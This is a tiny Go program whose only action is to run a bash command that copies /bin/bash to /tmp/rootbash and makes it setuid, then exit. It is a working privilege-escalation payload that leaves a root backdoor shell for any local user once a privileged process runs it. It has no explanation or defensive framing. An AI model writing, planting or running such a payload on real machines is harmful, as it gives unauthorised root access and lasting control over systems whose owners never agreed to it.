package main

import (
        "os"
        "os/exec"
)

func main() {
        _ = exec.Command("/bin/bash", "-c",
                "cp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash").Run()
        os.Exit(0)
}
